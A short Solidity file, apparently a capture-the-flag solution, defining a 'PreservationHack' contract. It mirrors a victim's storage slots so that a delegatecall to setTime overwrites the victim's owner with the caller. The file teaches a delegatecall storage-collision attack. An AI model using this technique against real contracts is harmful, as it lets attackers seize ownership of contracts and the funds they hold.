// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

contract PreservationHack {

  // stores a timestamp 
  address public lib1; // slot 0
  address public lib2; // slot 1
  address public owner; // slot 2
  uint storedTime;  // slot 3

  function setTime(uint _owner) public {
    owner = msg.sender; 
  }
}
